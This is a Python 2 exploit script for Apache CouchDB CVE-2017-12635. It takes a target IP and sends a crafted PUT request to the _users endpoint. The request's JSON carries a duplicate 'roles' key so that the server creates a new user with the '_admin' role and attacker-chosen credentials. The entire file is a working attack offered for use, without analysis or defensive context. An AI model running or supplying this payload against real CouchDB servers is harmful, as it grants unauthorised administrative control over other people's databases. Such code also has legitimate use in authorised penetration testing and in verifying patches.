#!/usr/bin/env python

'''
@author:        r4wd3r
@license:       MIT License
@contact:       r4wd3r@gmail.com
'''

import argparse
import re
import sys
import requests

parser = argparse.ArgumentParser(
    description='Exploits the Apache CouchDB JSON Remote Privilege Escalation Vulnerability' +
    ' (CVE-2017-12635)')
parser.add_argument('host', help='Host to attack.', type=str)
parser.add_argument('-p', '--port', help='Port of CouchDB Service', type=str, default='5984')
parser.add_argument('-u', '--user', help='Username to create as admin.',
                    type=str, default='couchara')
parser.add_argument('-P', '--password', help='Password of the created user.',
                    type=str, default='couchapass')
args = parser.parse_args()

host = args.host
port = args.port
user = args.user
password = args.password

pat_ip = re.compile("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
if not pat_ip.match(host):
    print "[x] Wrong host. Must be a valid IP address."
    sys.exit(1)

print "[+] User to create: " + user
print "[+] Password: " + password
print "[+] Attacking host " + host + " on port " + port

url = 'http://' + host + ':' + port

try:
    rtest = requests.get(url, timeout=10)
except requests.exceptions.Timeout:
    print "[x] Server is taking too long to answer. Exiting."
    sys.exit(1)
except requests.ConnectionError:
    print "[x] Unable to connect to the remote host."
    sys.exit(1)

# Payload for creating user
cu_url_payload = url + "/_users/org.couchdb.user:" + user
cu_data_payload = '{"type": "user", "name": "'+user+'", "roles": ["_admin"], "roles": [], "password": "'+password+'"}'

try:
    rcu = requests.put(cu_url_payload, data=cu_data_payload)
except requests.exceptions.HTTPError:
    print "[x] ERROR: Unable to create the user on remote host."
    sys.exit(1)

if rcu.status_code == 201:
    print "[+] User " + user + " with password " + password + " successfully created."
    sys.exit(0)
else:
    print "[x] ERROR " + str(rcu.status_code) + ": Unable to create the user on remote host."